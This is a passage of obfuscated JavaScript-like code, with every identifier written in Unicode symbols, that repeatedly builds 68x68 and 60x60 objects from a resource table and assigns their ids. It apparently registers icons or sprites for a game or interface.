			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔΔᐃᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃᐃⵠ], ᐃⲆᐃᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔΔᐃᐃᐃ].id = ᐃᐃ.ΔⵠΔΔᐃᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔΔᐃᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃᐃᐃᐃⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠΔΔᐃᐃᐃ].id = ᐃᐃ.ΔⵠΔΔᐃᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃΔⲆΔⵠΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔⲆᐃ].id = ᐃᐃ.ΔᐃΔⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔᐃⲆⲆΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔⲆᐃ].id = ᐃᐃ.ΔᐃΔⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆΔⲆᐃⵠ], ΔⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔⲆᐃ].id = ᐃᐃⲆ.ΔᐃΔⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔⲆ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔΔⲆ].id = ᐃᐃ.ᐃᐃΔΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⲆΔ], ⲆᐃΔᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔΔⲆ].id = ᐃᐃ.ᐃᐃΔΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆΔⵠᐃΔⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔΔⲆ].id = ᐃᐃⲆ.ᐃᐃΔΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆⵠᐃ], Δⵠᐃⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔⵠⵠ].id = ᐃᐃ.ⲆⲆΔⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⲆΔⵠⵠ].id = ᐃᐃ.ⲆⲆΔⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠΔᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⲆΔⵠⵠ].id = ᐃᐃⲆ.ⲆⲆΔⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃΔΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃⵠⲆΔᐃᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃΔΔⲆ].id = ᐃᐃ.ⲆᐃΔΔⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃΔΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠᐃ], ᐃᐃⲆΔⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃΔΔⲆ].id = ᐃᐃ.ⲆᐃΔΔⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃΔΔⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⵠΔⲆᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃΔΔⲆ].id = ᐃᐃⲆ.ⲆᐃΔΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆΔⲆΔⵠⵠ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆᐃᐃ].id = ᐃᐃ.ⲆⵠⲆᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆᐃᐃ], ⲆΔⵠⵠ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⲆᐃᐃ].id = ᐃᐃ.ⲆⵠⲆᐃᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔⵠΔ], ΔⲆΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⲆᐃᐃ].id = ᐃᐃⲆ.ⲆⵠⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⲆΔⲆᐃ], ⵠⲆΔⵠΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⵠᐃⲆ].id = ᐃᐃ.ⵠΔⵠᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⲆΔᐃⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⵠᐃⲆ].id = ᐃᐃ.ⵠΔⵠᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆⵠⲆΔᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⵠᐃⲆ].id = ᐃᐃⲆ.ⵠΔⵠᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃΔΔΔᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⲆΔⵠ].id = ᐃᐃ.ⵠⵠⲆΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠⲆΔⵠ].id = ᐃᐃ.ⵠⵠⲆΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠⲆᐃᐃⲆΔ], ⲆⲆΔⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠⲆΔⵠ].id = ᐃᐃⲆ.ⵠⵠⲆΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆᐃΔΔΔᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃΔᐃⵠ].id = ᐃᐃ.ΔᐃΔᐃⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠⲆᐃⵠΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔᐃΔᐃⵠ].id = ᐃᐃ.ΔᐃΔᐃⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔᐃⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃΔⲆΔᐃΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔᐃΔᐃⵠ].id = ᐃᐃⲆ.ΔᐃΔᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠⵠΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⲆ].id = ᐃᐃ.ⵠᐃⲆᐃⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠⵠΔⵠ], ⵠⲆΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃⲆ].id = ᐃᐃ.ⵠᐃⲆᐃⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆᐃⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔⵠᐃⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃⲆᐃⲆ].id = ᐃᐃⲆ.ⵠᐃⲆᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⵠⲆᐃⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆΔΔⵠ].id = ᐃᐃ.ⵠⲆΔΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔΔᐃⲆᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⲆΔΔⵠ].id = ᐃᐃ.ⵠⲆΔΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆΔΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃΔⵠ], ΔΔⵠΔ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⲆΔΔⵠ].id = ᐃᐃⲆ.ⵠⲆΔΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆᐃⲆⵠⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃⲆⵠ].id = ᐃᐃ.ᐃⵠᐃⲆⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠⲆΔⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆⵠ].id = ᐃᐃ.ᐃⵠᐃⲆⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃⲆⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆⵠⵠᐃⲆⲆ], ⲆⲆΔⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃⲆⵠ].id = ᐃᐃⲆ.ᐃⵠᐃⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃΔΔⲆⵠⲆ], ⲆΔⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔΔᐃ].id = ᐃᐃ.ⲆΔΔΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠᐃⲆᐃⵠ], ᐃⲆᐃᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔΔΔᐃ].id = ᐃᐃ.ⲆΔΔΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⲆⵠΔⲆᐃ], ΔⲆᐃⲆ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆΔΔΔᐃ].id = ᐃᐃⲆ.ⲆΔΔΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠΔⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆⲆⵠᐃⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠΔⵠⵠ].id = ᐃᐃ.ⵠⵠΔⵠⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔᐃⵠⲆΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠΔⵠⵠ].id = ᐃᐃ.ⵠⵠΔⵠⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠΔⵠⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⵠⵠⵠΔ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠΔⵠⵠ].id = ᐃᐃⲆ.ⵠⵠΔⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⲆⲆ].id = ᐃᐃ.ᐃᐃΔⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆⵠΔⵠⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔⲆⲆ].id = ᐃᐃ.ᐃᐃΔⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆᐃⲆΔⲆᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔⲆⲆ].id = ᐃᐃⲆ.ᐃᐃΔⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃΔⵠΔᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔⲆᐃ].id = ᐃᐃ.ⵠᐃΔⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠᐃΔⲆᐃ].id = ᐃᐃ.ⵠᐃΔⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠΔⲆⲆⲆⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠᐃΔⲆᐃ].id = ᐃᐃⲆ.ⵠᐃΔⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⵠⲆⲆ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃᐃΔ].id = ᐃᐃ.ΔⵠᐃᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⲆᐃⵠᐃᐃⲆ], ⵠⵠⵠᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃᐃΔ].id = ᐃᐃ.ΔⵠᐃᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃᐃΔ].info.ᐃⵠ[2] = this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃᐃΔ].info.ᐃⵠ[0];
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⲆΔᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔΔ].id = ᐃᐃ.ⲆᐃⵠΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⵠΔⵠᐃᐃ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔΔ].id = ᐃᐃ.ⲆᐃⵠΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔΔ].info.ᐃⵠ[Δᐃⵠⵠ] = this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⵠΔΔ].info.ᐃⵠ[0];
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠⲆⵠᐃᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃᐃ].id = ᐃᐃ.ⲆΔᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ], ΔΔⵠΔ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃᐃ].id = ᐃᐃ.ⲆΔᐃᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃᐃ].info.ᐃⵠ[ΔⵠⵠΔ] = this.ᐃⵠᐃ[ᐃᐃ.ⲆΔᐃᐃ].info.ᐃⵠ[0];
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔᐃᐃΔᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⵠᐃΔ].id = ᐃᐃ.ⲆⵠⵠᐃΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃΔⲆᐃΔⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆⵠⵠᐃΔ].id = ᐃᐃ.ⲆⵠⵠᐃΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠᐃΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃⵠⵠ], ⲆᐃΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆⵠⵠᐃΔ].id = ᐃᐃⲆ.ⲆⵠⵠᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔᐃΔⲆⲆⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃⲆⲆ].id = ᐃᐃ.ᐃⵠᐃⲆⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔⲆᐃΔⵠᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃⵠᐃⲆⲆ].id = ᐃᐃ.ᐃⵠᐃⲆⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃⲆⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆⲆΔⵠΔⲆ], ⲆᐃΔᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃⵠᐃⲆⲆ].id = ᐃᐃⲆ.ᐃⵠᐃⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔⵠᐃⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔΔΔ].id = ᐃᐃ.ᐃᐃΔΔΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠⵠᐃᐃΔΔ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ᐃᐃΔΔΔ].id = ᐃᐃ.ᐃᐃΔΔΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔΔΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⵠᐃΔⲆΔⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ᐃᐃΔΔΔ].id = ᐃᐃⲆ.ᐃᐃΔΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠΔⵠⲆⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆΔᐃ].id = ᐃᐃ.ΔⵠⲆΔᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠᐃⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⲆΔᐃ].id = ᐃᐃ.ΔⵠⲆΔᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆΔᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃΔᐃⲆΔᐃᐃ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⲆΔᐃ].id = ᐃᐃⲆ.ΔⵠⲆΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆᐃᐃΔᐃΔ], ⲆᐃΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⵠΔ].id = ᐃᐃ.ⵠⵠᐃⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠⲆᐃ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠⵠᐃⵠΔ].id = ᐃᐃ.ⵠⵠᐃⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔⵠⲆ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠⵠᐃⵠΔ].id = ᐃᐃⲆ.ⵠⵠᐃⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⵠᐃᐃᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⲆΔⵠ].id = ᐃᐃ.ⲆᐃⲆΔⵠ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃⲆⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃⲆΔⵠ].id = ᐃᐃ.ⲆᐃⲆΔⵠ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆΔⵠ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆᐃⵠᐃΔⵠ], ⵠⵠⵠᐃ);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃⲆΔⵠ].id = ᐃᐃⲆ.ⲆᐃⲆΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠΔΔⲆⵠᐃ], ⲆᐃΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆⵠΔ].id = ᐃᐃ.ⵠΔⲆⵠΔ;
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔᐃⲆΔᐃⲆⲆ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ⵠΔⲆⵠΔ].id = ᐃᐃ.ⵠΔⲆⵠΔ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆⵠΔ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⲆᐃΔⲆⲆΔ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⵠΔⲆⵠΔ].id = ᐃᐃⲆ.ⵠΔⲆⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔⵠⵠⵠΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃⵠⲆ].id = ᐃᐃ.ΔⵠᐃⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆⵠᐃΔⲆΔⵠ], ᐃⲆᐃᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠᐃⵠⲆ].id = ᐃᐃ.ΔⵠᐃⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃᐃⲆⵠⲆΔⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠᐃⵠⲆ].id = ᐃᐃⲆ.ΔⵠᐃⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃᐃⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃᐃⵠⲆ].id = ᐃᐃ.ⲆᐃᐃⵠⲆ;
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠⲆΔⵠⵠⵠⵠ], ᐃᐃⵠⲆᐃ);
			this.ᐃⵠᐃ[ᐃᐃ.ⲆᐃᐃⵠⲆ].id = ᐃᐃ.ⲆᐃᐃⵠⲆ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃᐃⵠⲆ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠΔⵠ], 3);
			this.ⵠⵠⲆ[ᐃᐃⲆ.ⲆᐃᐃⵠⲆ].id = ᐃᐃⲆ.ⲆᐃᐃⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔⵠⲆΔⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠⲆᐃ].id = ᐃᐃ.ΔⵠⵠⲆᐃ;
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⲆⵠ], 3);
			this.ᐃⵠᐃ[ᐃᐃ.ΔⵠⵠⲆᐃ].id = ᐃᐃ.ΔⵠⵠⲆᐃ;
			this.ⵠⵠⲆ[ᐃᐃⲆ.ΔⵠⵠⲆᐃ] = Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ΔΔΔⵠⵠᐃᐃᐃᐃ], ᐃⲆΔⵠ);
